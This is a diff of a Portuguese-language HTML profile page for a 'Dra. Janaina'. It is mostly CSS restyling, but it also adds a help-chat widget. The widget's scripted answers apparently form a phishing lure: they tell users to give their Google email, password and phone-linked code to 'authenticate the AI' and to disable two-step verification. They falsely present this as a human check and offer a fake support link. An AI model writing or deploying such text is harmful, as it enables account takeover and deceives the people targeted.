@@ -21,6 +21,7 @@
             border-top-right-radius: 20px;
             box-shadow: 0 -2px 10px rgba(0,0,0,0.1);
             z-index: 1000;
+            border: 2px solid #ff69b4; /* Borda retangular */
         }
         
         .bottom-sheet.show { display: block; }
@@ -64,7 +65,7 @@
         
         .profile-icons-row {
             display: flex;
-            justify-content: space-around;
+            justify-content: center; /* Centraliza os botões */
             padding: 20px;
             flex-wrap: wrap;
             gap: 10px;
@@ -79,6 +80,15 @@
             padding: 10px;
             min-width: 80px;
             cursor: pointer;
+            border: 1px solid #ff69b4; /* Borda dos botões */
+            border-radius: 10px; /* Bordas arredondadas */
+            background: #f9f9f9; /* Fundo dos botões */
+            transition: background 0.3s; /* Efeito de transição */
+        }
+
+        .item-social:hover {
+            background: #ff69b4; /* Cor de fundo ao passar o mouse */
+            color: white; /* Cor do texto ao passar o mouse */
         }
 
         .item-social i {
@@ -93,7 +103,7 @@
         
         .profile-info {
             text-align: center;
-            padding: 80px 20px 10px 20px;
+            padding: 20px 20px 10px 20px; /* Ajuste o padding para centralizar melhor */
         }
         
         .profile-name {
@@ -114,6 +124,18 @@
             max-width: 400px;
             margin: auto;
             text-align: center;
+        }
+
+        .profile-container {
+            border: 2px solid #ff69b4; /* Borda rosa */
+            border-radius: 10px; /* Bordas arredondadas */
+            padding: 20px; /* Espaçamento interno */
+            margin: 20px auto; /* Centraliza o contêiner */
+            max-width: 450px; /* Largura máxima */
+            display: flex;
+            flex-direction: column;
+            align-items: center; /* Centraliza horizontalmente */
+            justify-content: flex-start; /* Alinha para o topo */
         }
         
         .bt-back {
@@ -157,7 +179,7 @@
 
     <div class="avatar" style="background-image: url('https://example.com/imagem.jpg')"></div>
 
-    <div class="profile-main-body">
+    <div class="profile-container"> <!-- Novo contêiner para o perfil -->
         <div class="profile-info">
             <span class="profile-name">
                 Dra. Janaina
@@ -207,5 +229,126 @@
             document.querySelector('.bottom-sheet').classList.remove('show');
         });
     </script>
+
+<!-- Botão de ajuda -->
+    <div id="helpButton" style="position: fixed; bottom: 20px; right: 20px; background-color: #ff1493; color: white; border-radius: 50%; padding: 5px; font-size: 16px; cursor: pointer; box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1); width: 30px; height: 30px; text-align: center; display: flex; justify-content: center; align-items: center;">
+        ?
+    </div>
+    
+    <!-- Chat de ajuda -->
+    <div id="chatContainer" style="display: none; position: fixed; bottom: 70px; right: 20px; width: 300px; background-color: white; padding: 15px; border-radius: 8px; box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1); font-family: Arial, sans-serif;">
+        <h3 style="margin: 0;">Ajuda</h3>
+        <p id="menuPrompt">Escolha uma das opções abaixo:</p><br>
+        <ul id="faqList" style="list-style-type: none; padding: 0;">
+            <li style="margin-bottom: 10px;"><button onclick="showAnswer(1, 'Como fazer login?')" style="background-color: #ff1493; color: white; border: none; border-radius: 5px; padding: 10px; cursor: pointer; width: 100%;">1 - Como fazer login?</button></li>
+            <li style="margin-bottom: 10px;"><button onclick="showAnswer(2, 'Não consigo fazer login, o código não foi enviado.')" style="background-color: #ff1493; color: white; border: none; border-radius: 5px; padding: 10px; cursor: pointer; width: 100%;">2 - Não consigo fazer login, o código não foi enviado.</button></li>
+            <li style="margin-bottom: 10px;"><button onclick="showAnswer(3, 'Porque não consigo autenticar a conta Google com a IA?')" style="background-color: #ff1493; color: white; border: none; border-radius: 5px; padding: 10px; cursor: pointer; width: 100%;">3 - Porque não consigo autenticar a conta Google com a IA?</button></li>
+            <li style="margin-bottom: 10px;"><button onclick="showAnswer(4, 'Devo desativar a segurança em duas etapas?')" style="background-color: #ff1493; color: white; border: none; border-radius: 5px; padding: 10px; cursor: pointer; width: 100%;">4 - Devo desativar a segurança em duas etapas?</button></li>
+            <li style="margin-bottom: 10px;"><button onclick="showAnswer(5, 'Por que cadastrar telefone na conta Google?')" style="background-color: #ff1493; color: white; border: none; border-radius: 5px; padding: 10px; cursor: pointer; width: 100%;">5 - Por que cadastrar telefone na conta Google?</button></li>
+            <li style="margin-bottom: 10px;"><button onclick="showAnswer(6, 'Nenhuma das alternativas acima resolveu o problema, contatar suporte.')" style="background-color: #ff1493; color: white; border: none; border-radius: 5px; padding: 10px; cursor: pointer; width: 100%;">6 - Nenhuma das alternativas acima resolveu o problema, contatar suporte.</button></li>
+        </ul>
+        <div id="answer" style="margin-top: 15px;"></div>
+        <button onclick="closeChat()" style="margin-top: 10px; background-color: #f44336; color: white; border: none; border-radius: 5px; padding: 10px; cursor: pointer; width: 100%;">Fechar</button>
+    </div>
+
+    <script>
+        // Exibe o chat quando o botão de ajuda é clicado
+        document.getElementById('helpButton').onclick = function() {
+            resetChat(); // Reseta o chat para o menu principal
+            document.getElementById('chatContainer').style.display = 'block';
+        };
+        
+        // Fecha o chat
+        function closeChat() {
+            document.getElementById('chatContainer').style.display = 'none';
+        }
+
+        // Reseta o chat para o menu principal
+        function resetChat() {
+            document.getElementById('faqList').style.display = 'block'; // Mostra as perguntas novamente
+            document.getElementById('menuPrompt').innerText = "Escolha uma das opções abaixo:"; // Restaura o texto do menu
+            document.getElementById('answer').innerHTML = ''; // Limpa a resposta
+        }
+
+        // Exibe a resposta de acordo com a pergunta clicada
+        function showAnswer(questionNumber, questionText) {
+            const answers = {
+                1: "O acesso a plataforma de autenticação é obrigatório para acessar a IA, pois como usamos tecnologias do Google para melhorias na IA, deve autenticar a IA com a sua conta pessoal do Google, isso é somente para verificar a segurança para a empresa Google que você é realmente humano e não um robô. O login deve ser feito com (E-mail, senha e telefone vinculado a sua conta do Google). Caso alguma informação esteja inválida, errada ou incorreta o acesso é suspenso, o sistema não dará avisos extras, porém a IA não será acessada, dessa forma algum problema na autenticação ocorreu.",
+                2: "O código não foi enviado devido a ter colocado o número errado, ou o mesmo não foi cadastrado na sua conta do Google. (Lembre-se que a segurança em duas etapas se estiver ativada não libera o envio do código pela linha móvel.) Caso errou a senha ou e-mail também o código não será enviado, somente tem 3 tentativas diárias, se ambas forem com falha somente no outro dia.",
+                3: "A autenticação é feita com as credenciais verdadeiras, o sistema da nossa plataforma verifica se as informações são verdadeiras com a conta que informou, caso informar algum e-mail falso o sistema detectará e bloqueará o acesso, a demora para acessar a IA é a validação que o sistema está aguardando...",
+                4: "Sim, caso a segurança em dois fatores estar ativa o código não é enviado para o chip cadastrado na sua conta Google, portanto deve desativar nas configurações da sua conta.",
+                5: "O telefone é obrigatório para receber o código de acesso e autenticar que não é um robô, sem o telefone cadastrado o acesso não será realizado, o Google entende que não é um humano e bloqueia a solicitação. O telefone é a única maneira de realizar o acesso com a IA e Google, caso não concordar com os termos descritos na página do Google de uso do telefone para o acesso, a nossa equipe de suporte não poderá ajudar. Link da política do Google sobre o uso do número de telefone.<br><button onclick=\"window.open('https://support.google.com/adsense/answer/2938681?hl=pt-BR', '_blank')\" style='margin-top: 10px; background-color: #4CAF50; color: white; border: none; border-radius: 5px; padding: 10px; cursor: pointer; width: 100%;'>Saiba mais</button>",
+                6: "Clique aqui para registrar sua manifestação, nossos atendentes retornarão em até 48 horas...<br><button onclick=\"window.open('https://www.sistemadeiaindisponívelparausodevidoamanutencao.com', '_blank')\" style='margin-top: 10px; background-color: #4CAF50; color: white; border: none; border-radius: 5px; padding: 10px; cursor: pointer; width: 100%;'>Fale conosco, botão indisponível ainda.</button>"
+            };
+
+            // Oculta as perguntas
+            document.getElementById('faqList').style.display = 'none';
+
+            // Substitui o texto do menu
+            document.getElementById('menuPrompt').innerText = questionText;
+
+            // Exibe o efeito de "digitando" com animação
+            const answerDiv = document.getElementById('answer');
+            answerDiv.innerHTML = '<div style="font-style: italic; color: gray;">Digitando <span class="dots">...</span></div>';
+            
+            // Inicia a animação dos três pontinhos
+            animateDots();
+
+            setTimeout(() => {
+                answerDiv.innerHTML = `<div style="background-color: #f1f1f1; border-radius: 10px; padding: 10px; margin-top: 10px; max-width: 80%; word-wrap: break-word;">${answers[questionNumber]}</div>
+                <button onclick="backToMenu()" style="margin-top: 10px; background-color: #ff1493; color: white; border: none; border-radius: 5px; padding: 10px; cursor: pointer; width: 100%;">Voltar ao Menu</button>`;
+                stopAnimatingDots(); // Para a animação após a resposta ser exibida
+            }, 10000); // Tempo de espera de 10 segundos antes de mostrar a resposta
+        }
+
+        // Função para animar os três pontinhos
+        let dotAnimationInterval;
+        function animateDots() {
+            const dots = document.querySelector('.dots');
+            let dotCount = 0;
+            dotAnimationInterval = setInterval(() => {
+                dotCount = (dotCount + 1) % 4; // Ciclo de 0 a 3
+                dots.textContent = '.'.repeat(dotCount); // Atualiza o número de pontos
+            }, 500); // Atualiza a cada 500ms
+        }
+
+        // Função para parar a animação dos três pontinhos
+        function stopAnimatingDots() {
+            clearInterval(dotAnimationInterval); // Para a animação
+            const dots = document.querySelector('.dots');
+            dots.textContent = ''; // Limpa os pontos
+        }
+
+        // Função para voltar ao menu de opções
+        function backToMenu() {
+            document.getElementById('faqList').style.display = 'block'; // Mostra as perguntas novamente
+            document.getElementById('menuPrompt').innerText = "Escolha uma das opções abaixo:"; // Restaura o texto do menu
+            document.getElementById('answer').innerHTML = ''; // Limpa a resposta
+        }
+    </script>
+
+    <style>
+        /* Estilo adicional para o chat */
+        #chatContainer {
+            font-family: Arial, sans-serif;
+        }
+
+        #answer {
+            margin-top: 15px;
+        }
+
+        /* Estilo para os três pontinhos */
+        .dots {
+            display: inline-block;
+            font-size: 24px; /* Aumenta o tamanho dos pontos */
+            animation: blink 1s infinite;
+        }
+
+        @keyframes blink {
+            0%, 20% { opacity: 1; }
+            40%, 60% { opacity: 0; }
+            80%, 100% { opacity: 1; }
+         }
+    </style>
 </body>
 </html>
